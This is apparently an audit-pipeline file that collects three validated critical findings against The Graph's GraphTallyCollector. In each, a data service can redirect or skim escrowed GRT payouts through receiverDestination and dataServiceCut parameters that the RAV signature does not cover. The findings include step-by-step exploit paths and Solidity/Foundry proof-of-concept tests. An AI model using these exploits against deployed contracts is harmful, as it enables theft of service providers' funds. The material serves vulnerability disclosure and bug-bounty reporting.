# thegraph Round 4 Canonicalization Input

Source validated run: `/Users/apmfree/Desktop/CHAIN SHIELD/ai-agent-audit/validation-three-shot/runs/v2/thegraph-run-001.md`
Candidate count: `3`

This file contains only findings currently marked `Valid` with reportable severity for the configured validation profile.

## Candidates

## H-31 / `B1QFkkzj9DYXaowCh7Vf_`
- Finding title: Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts
- Report lines: 3699-3771

### Original Report Block
```md
## [H-31]. Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts

## id: B1QFkkzj9DYXaowCh7Vf_

## Derived From Pattern/Invariant
AccessControlOrAuthByPass: payout destination is not authorized by the signed RAV

## Exploit Type
AuthByPass

## Location
GraphTallyCollector.collect

## Finding Status: Valid
### Finding Status Justification: The vulnerable path exists in the in-scope GraphTallyCollector.collect/_collect flow. collect decodes caller-supplied data as (SignedRAV, uint256 dataServiceCut, address receiverDestination), verifies only that signedRAV.rav.dataService == msg.sender and that the recovered signer is authorized by the payer, then forwards receiverDestination to PaymentsEscrow.collect. _encodeRAV signs collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata only; receiverDestination is not included. The active-provision check limits collection to a dataService with provider tokens available, but it does not authenticate the payout destination. The comments even describe receiverDestination as the address where the receiver payment should be sent, so the caller-controlled value is payment-affecting. No complete safeguard requires receiverDestination == serviceProvider or separate provider authorization. The file is explicitly in scope and the behavior is not documented as an accepted risk. Exploitation requires the RAV dataService to submit a valid RAV, but that is a normal protocol participant path, not governance/admin abuse, leaked keys, or pure victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:RequiresRole


## Description
GraphTallyCollector verifies that the caller is the RAV dataService and that the RAV signer is authorized for the payer, but the receiver payout destination is decoded from caller-supplied calldata and is not part of the signed ReceiptAggregateVoucher. Vulnerable snippet: `(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(_data, (SignedRAV, uint256, address)); ... address receiver = signedRAV.rav.serviceProvider; ... _graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. The RAV binds `serviceProvider` but not `receiverDestination`, so a malicious dataService named in a valid RAV can consume the serviceProvider tuple in `tokensCollected` while instructing escrow to pay the receiver share to an arbitrary address.

## Impact
A malicious dataService can steal service provider payments directly from PaymentsEscrow. If high-value RAVs are settled through this collector, the blast radius is the full collectible receiver portion of those escrowed GRT payments.

## Proof of Concept
1. A payer authorizes a signer and the signer issues a valid RAV naming an honest serviceProvider and a dataService. 2. The dataService calls `collect` with the valid signed RAV but sets `receiverDestination` to the attacker address. 3. `_collect` accepts the RAV because `signedRAV.rav.dataService == msg.sender` and the signer is authorized. 4. `tokensCollected[dataService][collectionId][serviceProvider][payer]` is advanced for the honest serviceProvider. 5. PaymentsEscrow receives the attacker-chosen destination and pays the receiver leg there, consuming the serviceProvider entitlement.

## Proof of Code
pragma solidity ^0.8.20;
enum PaymentTypes { Escrow, QueryFee }
contract MockEscrow {
    mapping(address => uint256) public receiverPaid;
    function collect(PaymentTypes, address, address, uint256 amount, address, uint256 cut, address receiverDestination) external {
        uint256 receiverAmount = amount - ((amount * cut) / 1_000_000);
        receiverPaid[receiverDestination] += receiverAmount;
    }
}
contract ReceiverDestinationPoC {
    struct RAV { bytes32 collectionId; address payer; address serviceProvider; address dataService; uint64 timestampNs; uint128 valueAggregate; bytes metadata; }
    struct SignedRAV { RAV rav; bytes signature; }
    mapping(address => mapping(bytes32 => mapping(address => mapping(address => uint256)))) public tokensCollected;
    MockEscrow escrow = new MockEscrow();
    address payer = address(0x1);
    address serviceProvider = address(0x2);
    address attacker = address(0x3);
    function test_receiverDestinationCanRedirectPayout() public {
        RAV memory rav = RAV(bytes32(0), payer, serviceProvider, address(this), 1, 100 ether, new bytes(0));
        SignedRAV memory signed = SignedRAV(rav, new bytes(0));
        bytes memory data = abi.encode(signed, uint256(0), attacker);
        this.collect(PaymentTypes.Escrow, data);
        assertEq(escrow.receiverPaid(attacker), 100 ether);
        assertEq(escrow.receiverPaid(serviceProvider), 0);
        assertEq(tokensCollected[address(this)][bytes32(0)][serviceProvider][payer], 100 ether);
    }
    function collect(PaymentTypes paymentType, bytes calldata data) external returns (uint256) { return _collect(paymentType, data, 0); }
    function _collect(PaymentTypes paymentType, bytes calldata data, uint256) private returns (uint256) {
        (SignedRAV memory signed, uint256 cut, address receiverDestination) = abi.decode(data, (SignedRAV, uint256, address));
        require(signed.rav.dataService == msg.sender);
        uint256 already = tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer];
        require(signed.rav.valueAggregate > already);
        uint256 amount = signed.rav.valueAggregate - already;
        tokensCollected[signed.rav.dataService][signed.rav.collectionId][signed.rav.serviceProvider][signed.rav.payer] += amount;
        escrow.collect(paymentType, signed.rav.payer, signed.rav.serviceProvider, amount, signed.rav.dataService, cut, receiverDestination);
        return amount;
    }
    function assertEq(uint256 a, uint256 b) internal pure { require(a == b); }
}

## Suggested Mitigation
Bind the receiver payout destination in the signed RAV, or require `receiverDestination == signedRAV.rav.serviceProvider` unless the serviceProvider has separately signed an authorization for that destination. Emit and store the signed destination so the escrow payout target cannot be chosen only by the collecting dataService.
```

### Current Validated Block
### H-31 / `B1QFkkzj9DYXaowCh7Vf_`
- Finding Title: Unsigned receiverDestination lets the data service redirect GraphTallyCollector payouts
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Critical
- Root Cause Family: `unsigned-rav-payout-destination`
- Bounty Criteria Match: critical (smart contract): A bug that could cause significant (>$1M) User funds to be lost or stolen directly from protocol smart contracts (not including slashing)
- Checklist Gates Passed: `in-scope asset, code path exists, unprivileged protocol-participant path, exact direct-theft impact row, no listed exclusion`
- Checklist Gates Failed: `-`
- Detailed Reason: The RAV binds the payer, service provider, and data service but not the service provider's payout destination. A malicious data service named in a valid high-value RAV can call the in-scope collector directly with an attacker-controlled destination, consuming the aggregate and causing escrowed GRT to be paid away from the service provider; for balances above $1M this maps cleanly to the Critical direct-theft row.
- Code Evidence: `GraphTallyCollector._collect()` decodes `receiverDestination` from caller data and forwards it to `PaymentsEscrow.collect()`, while `_encodeRAV()` hashes only RAV fields and omits the destination; `SubgraphService.setPaymentsDestination()` shows the intended provider-controlled destination is separate from caller calldata.

## H-115 / `ehVpD-cV2madnpbmgU4kx`
- Finding title: RAV signatures omit payment parameters allowing data service to redirect or skim collections
- Report lines: 10763-10893

### Original Report Block
```md
## [H-115]. RAV signatures omit payment parameters allowing data service to redirect or skim collections

## id: ehVpD-cV2madnpbmgU4kx

## Derived From Pattern/Invariant
AccessControlOrAuthByPass

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: The combined root cause is directly present. _collect decodes dataServiceCut and receiverDestination from caller-controlled calldata, receives paymentType as an external argument, and forwards all three to PaymentsEscrow.collect. The signed RAV hash covers only collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata. The collector checks msg.sender equals rav.dataService, the signer is authorized for the payer, and the serviceProvider has an active provision with that dataService, but none of those checks authenticates paymentType, dataServiceCut, or receiverDestination. PPMMath is imported, yet GraphTallyCollector does not validate dataServiceCut before forwarding it. The provided comments define dataServiceCut and receiverDestination as payment collection parameters, making them payment-affecting in this code path. The in-scope production contract contains no full safeguard binding these parameters to the RAV or requiring separate service-provider authorization. This is not explicitly documented as accepted protocol behavior. A dataService named in a valid RAV can exercise the path now, without governance/admin compromise or mere victim misuse.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The signed EIP-712 ReceiptAggregateVoucher only commits to collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata. However collect() decodes paymentType, dataServiceCut, and receiverDestination from caller-controlled calldata and forwards them to PaymentsEscrow without requiring them to be signed or otherwise authorized by the payer or service provider. Vulnerable flow: `abi.decode(_data, (SignedRAV, uint256, address))` accepts `dataServiceCut` and `receiverDestination`; `_encodeRAV()` hashes only the RAV fields; then `_graphPaymentsEscrow().collect(_paymentType, payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination)` executes with the unsigned parameters. A valid rav.dataService caller can therefore take a legitimate RAV for a serviceProvider and choose a 100% cut, alternate paymentType, or attacker-controlled receiverDestination at execution time, depending on escrow semantics.

## Impact
A data service with any valid high-value RAV can cause escrowed payer funds to be settled with attacker-chosen payout parameters, stealing or misdirecting service-provider payment value directly from protocol escrow.

## Proof of Concept
1. Payer authorizes a signer. 2. The signer signs a RAV for payer -> serviceProvider with dataService and valueAggregate. 3. The RAV does not include dataServiceCut, receiverDestination, or paymentType. 4. The dataService submits collect() with the valid signed RAV but sets dataServiceCut to 1_000_000 and receiverDestination to an attacker address. 5. GraphTallyCollector accepts the signature because only RAV fields are checked, increments tokensCollected, and calls PaymentsEscrow.collect with the attacker-selected parameters.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";

contract MockController {
    address public staking;
    address public escrow;
    constructor(address s, address e) { staking = s; escrow = e; }
    function getContractProxy(bytes32 name) external view returns (address) {
        if (name == keccak256(bytes("Staking"))) return staking;
        if (name == keccak256(bytes("PaymentsEscrow"))) return escrow;
        return address(0xBEEF);
    }
}

contract MockStaking {
    function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; }
}

contract MockEscrow {
    address public lastPayer;
    address public lastReceiver;
    address public lastDataService;
    uint256 public lastAmount;
    uint256 public lastDataServiceCut;
    address public lastReceiverDestination;
    function collect(
        IGraphPayments.PaymentTypes,
        address payer,
        address receiver,
        uint256 amount,
        address dataService,
        uint256 dataServiceCut,
        address receiverDestination
    ) external {
        lastPayer = payer;
        lastReceiver = receiver;
        lastAmount = amount;
        lastDataService = dataService;
        lastDataServiceCut = dataServiceCut;
        lastReceiverDestination = receiverDestination;
    }
}

contract GraphTallyCollectorUnsignedParamsTest is Test {
    function testDataServiceCanChooseUnsignedCutAndDestination() public {
        uint256 signerPk = 0xA11CE;
        address signer = vm.addr(signerPk);
        address payer = address(0x1001);
        address serviceProvider = address(0x2002);
        address dataService = address(0x3003);
        address attackerDestination = address(0x4444);

        MockStaking staking = new MockStaking();
        MockEscrow escrow = new MockEscrow();
        MockController controller = new MockController(address(staking), address(escrow));
        GraphTallyCollector collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 7 days);

        uint256 deadline = block.timestamp + 1 days;
        bytes32 authHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer));
        bytes32 authDigest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", authHash));
        (uint8 av, bytes32 ar, bytes32 as_) = vm.sign(signerPk, authDigest);
        vm.prank(payer);
        collector.authorizeSigner(signer, deadline, abi.encodePacked(ar, as_, av));

        IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({
            collectionId: bytes32("collection"),
            payer: payer,
            serviceProvider: serviceProvider,
            dataService: dataService,
            timestampNs: uint64(block.timestamp * 1e9),
            valueAggregate: uint128(1_000_000 ether),
            metadata: ""
        });
        bytes32 ravDigest = collector.encodeRAV(rav);
        (uint8 rv, bytes32 rr, bytes32 rs) = vm.sign(signerPk, ravDigest);
        IGraphTallyCollector.SignedRAV memory signedRAV = IGraphTallyCollector.SignedRAV({
            rav: rav,
            signature: abi.encodePacked(rr, rs, rv)
        });

        bytes memory data = abi.encode(signedRAV, uint256(1_000_000), attackerDestination);
        vm.prank(dataService);
        collector.collect(IGraphPayments.PaymentTypes(0), data);

        assertEq(escrow.lastPayer(), payer);
        assertEq(escrow.lastReceiver(), serviceProvider);
        assertEq(escrow.lastDataService(), dataService);
        assertEq(escrow.lastAmount(), 1_000_000 ether);
        assertEq(escrow.lastDataServiceCut(), 1_000_000);
        assertEq(escrow.lastReceiverDestination(), attackerDestination);
    }
}

## Suggested Mitigation
Bind all payment-affecting parameters to the signed authorization. Add paymentType, dataServiceCut, and receiverDestination to the EIP712 RAV typehash, or require an independent service-provider authorization for dataServiceCut and receiverDestination. Also validate dataServiceCut <= 1_000_000 in GraphTallyCollector before calling escrow.
```

### Current Validated Block
### H-115 / `ehVpD-cV2madnpbmgU4kx`
- Finding Title: RAV signatures omit payment parameters allowing data service to redirect or skim collections
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Critical
- Root Cause Family: `unsigned-rav-payment-params`
- Bounty Criteria Match: critical (smart contract): A bug that could cause significant (>$1M) User funds to be lost or stolen directly from protocol smart contracts (not including slashing)
- Checklist Gates Passed: `in-scope asset, code path exists, unprivileged protocol-participant path, exact direct-theft impact row, no listed exclusion`
- Checklist Gates Failed: `-`
- Detailed Reason: The signed RAV omits payment-affecting execution parameters, while `GraphTallyCollector` accepts those parameters from the data service caller and forwards them into escrow settlement. A malicious data service with a valid high-value RAV can set a 100% data-service cut and/or attacker payout destination, causing escrowed GRT to be stolen or misdirected; this is direct theft from an in-scope protocol smart contract when value exceeds $1M.
- Code Evidence: `GraphTallyCollector._collect()` decodes `dataServiceCut` and `receiverDestination` from `_data` and forwards `_paymentType` to `PaymentsEscrow.collect()`, while `GraphTallyCollector._encodeRAV()` hashes only `collectionId`, `payer`, `serviceProvider`, `dataService`, `timestampNs`, `valueAggregate`, and `metadata`; `GraphPayments.collect()` then pays the chosen cut/destination.

## H-116 / `VQKcGszzCjO6o-P5XLfDl`
- Finding title: Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts
- Report lines: 10894-10945

### Original Report Block
```md
## [H-116]. Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts

## id: VQKcGszzCjO6o-P5XLfDl

## Derived From Pattern/Invariant
UnsafeRecipient / AccessControlOrAuthByPass: receiver payout destination must be authorized by the signed serviceProvider

## Exploit Type
AuthByPass

## Location
GraphTallyCollector._collect

## Finding Status: Valid
### Finding Status Justification: This is the same receiverDestination authorization issue expressed at _collect level, and the vulnerable path is present. _collect decodes receiverDestination from _data supplied by the caller and forwards it to _graphPaymentsEscrow().collect while setting receiver to signedRAV.rav.serviceProvider. _encodeRAV omits receiverDestination, so a valid RAV binds the serviceProvider identity but not the destination where the receiver side is sent. The only caller restriction is that msg.sender must equal rav.dataService, plus signer authorization and active provision checks; none fully prevents the dataService from choosing an arbitrary receiverDestination. tokensCollected is then incremented for the honest serviceProvider/payer tuple before the escrow call, consuming the aggregate. GraphTallyCollector is listed in the audit scope. There is no exact documentation saying the protocol intentionally lets the dataService redirect receiver payouts without provider authorization. The exploit path exists in current code and does not depend on a future upgrade, privileged administrator, compromised credential, or a pure user mistake without a protocol flaw.
### Finding Complexity: 0
## Minimim Privilege Required:Permissionless


## Description
The RAV signature binds collectionId, payer, serviceProvider, dataService, timestampNs, valueAggregate, and metadata, but it does not bind the payout destination. _collect decodes receiverDestination directly from caller-controlled calldata and forwards it to escrow: `(SignedRAV memory signedRAV, uint256 dataServiceCut, address receiverDestination) = abi.decode(_data, (SignedRAV, uint256, address)); ... address receiver = signedRAV.rav.serviceProvider; ... _graphPaymentsEscrow().collect(_paymentType, signedRAV.rav.payer, receiver, tokensToCollect, dataService, dataServiceCut, receiverDestination);`. Because msg.sender only needs to equal signedRAV.rav.dataService, a malicious or compromised dataService can submit a valid RAV naming an honest serviceProvider while replacing receiverDestination with an attacker address. tokensCollected is then incremented for the honest serviceProvider tuple, consuming the collectible aggregate while escrow is instructed to pay elsewhere.

## Impact
A dataService can steal serviceProvider payments from PaymentsEscrow and permanently consume the signed aggregate for the honest provider, causing direct loss of escrowed GRT and preventing later legitimate collection for the same RAV amount.

## Proof of Concept
1. Payer authorizes a signer. 2. The signer signs a RAV for payer, honest serviceProvider, and attacker-controlled dataService. The signed RAV does not include receiverDestination. 3. The attacker calls collect as the RAV dataService and ABI-encodes receiverDestination = attacker. 4. GraphTallyCollector verifies the RAV, increments tokensCollected[dataService][collectionId][serviceProvider][payer], and calls PaymentsEscrow.collect with receiver = serviceProvider but receiverDestination = attacker. 5. Escrow pays the attacker-controlled destination while the serviceProvider's collectible aggregate is consumed.

## Proof of Code
// SPDX-License-Identifier: GPL-3.0-or-later
pragma solidity ^0.8.27;

import {Test} from "forge-std/Test.sol";
import {GraphTallyCollector} from "../contracts/payments/collectors/GraphTallyCollector.sol";
import {IGraphPayments} from "@graphprotocol/interfaces/contracts/horizon/IGraphPayments.sol";
import {IGraphTallyCollector} from "@graphprotocol/interfaces/contracts/horizon/IGraphTallyCollector.sol";

contract MockController { mapping(bytes32 => address) public proxies; function set(bytes memory name, address value) external { proxies[keccak256(name)] = value; } function getContractProxy(bytes32 name) external view returns (address) { return proxies[name]; } }
contract MockStaking { function getProviderTokensAvailable(address, address) external pure returns (uint256) { return 1; } }
contract MockEscrow { address public lastReceiverDestination; mapping(address => uint256) public paid; function collect(IGraphPayments.PaymentTypes, address, address, uint256 tokens, address, uint256, address receiverDestination) external { lastReceiverDestination = receiverDestination; paid[receiverDestination] += tokens; } }

contract GraphTallyCollectorRedirectTest is Test {
    GraphTallyCollector collector; MockEscrow escrow; uint256 signerPk = 0xA11CE; address signer; address payer = address(0x1001); address provider = address(0x2002); address dataService = address(0x3003); address attacker = address(0x4444);
    function setUp() public { MockController controller = new MockController(); MockStaking staking = new MockStaking(); escrow = new MockEscrow(); address dummy = address(0xBEEF); controller.set(bytes("GraphToken"), dummy); controller.set(bytes("Staking"), address(staking)); controller.set(bytes("GraphPayments"), dummy); controller.set(bytes("PaymentsEscrow"), address(escrow)); controller.set(bytes("EpochManager"), dummy); controller.set(bytes("RewardsManager"), dummy); controller.set(bytes("GraphTokenGateway"), dummy); controller.set(bytes("GraphProxyAdmin"), dummy); controller.set(bytes("Curation"), dummy); collector = new GraphTallyCollector("GraphTallyCollector", "1", address(controller), 1 days); signer = vm.addr(signerPk); uint256 deadline = block.timestamp + 1 days; bytes32 messageHash = keccak256(abi.encodePacked(block.chainid, address(collector), "authorizeSignerProof", deadline, payer)); bytes32 digest = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", messageHash)); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); vm.prank(payer); collector.authorizeSigner(signer, deadline, abi.encodePacked(r, s, v)); }
    function signedRAV(bytes32 cid, uint128 amount) internal returns (IGraphTallyCollector.SignedRAV memory sr) { IGraphTallyCollector.ReceiptAggregateVoucher memory rav = IGraphTallyCollector.ReceiptAggregateVoucher({collectionId: cid, payer: payer, serviceProvider: provider, dataService: dataService, timestampNs: uint64(block.timestamp), valueAggregate: amount, metadata: bytes("")}); bytes32 digest = collector.encodeRAV(rav); (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPk, digest); sr = IGraphTallyCollector.SignedRAV({rav: rav, signature: abi.encodePacked(r, s, v)}); }
    function test_unsignedReceiverDestinationRedirectsPayout() public { bytes32 cid = keccak256("cid"); IGraphTallyCollector.SignedRAV memory sr = signedRAV(cid, 100 ether); bytes memory data = abi.encode(sr, uint256(0), attacker); vm.prank(dataService); uint256 collected = collector.collect(IGraphPayments.PaymentTypes(0), data, 0); assertEq(collected, 100 ether); assertEq(escrow.lastReceiverDestination(), attacker); assertEq(escrow.paid(attacker), 100 ether); assertEq(escrow.paid(provider), 0); assertEq(collector.tokensCollected(dataService, cid, provider, payer), 100 ether); }
}

## Suggested Mitigation
Bind receiverDestination in the signed RAV, or require receiverDestination == signedRAV.rav.serviceProvider unless the serviceProvider has separately authorized the destination on-chain or in an included signature field. Perform this validation before incrementing tokensCollected or calling escrow.
```

### Current Validated Block
### H-116 / `VQKcGszzCjO6o-P5XLfDl`
- Finding Title: Unsigned receiverDestination lets GraphTallyCollector.collect redirect service-provider payouts
- Decision: Valid
- Confidence: High
- Bug Exists: Yes
- Severity Assessment: Critical
- Root Cause Family: `unsigned-rav-payout-destination`
- Bounty Criteria Match: critical (smart contract): A bug that could cause significant (>$1M) User funds to be lost or stolen directly from protocol smart contracts (not including slashing)
- Checklist Gates Passed: `in-scope asset, code path exists, unprivileged protocol-participant path, exact direct-theft impact row, no listed exclusion`
- Checklist Gates Failed: `-`
- Detailed Reason: This is the receiver-destination subset of H-115 and is submission-ready on severity: the service provider identity is signed, but the actual payout address is not. A malicious data service can consume a valid aggregate and send the provider side to an attacker-controlled address, directly stealing escrowed GRT if the RAV/escrow value is significant.
- Code Evidence: `GraphTallyCollector._collect()` sets `receiver = signedRAV.rav.serviceProvider` but forwards caller-supplied `receiverDestination`; `_encodeRAV()` omits that field, and `GraphPayments.collect()` transfers remaining receiver proceeds to `receiverDestination` when it is nonzero.

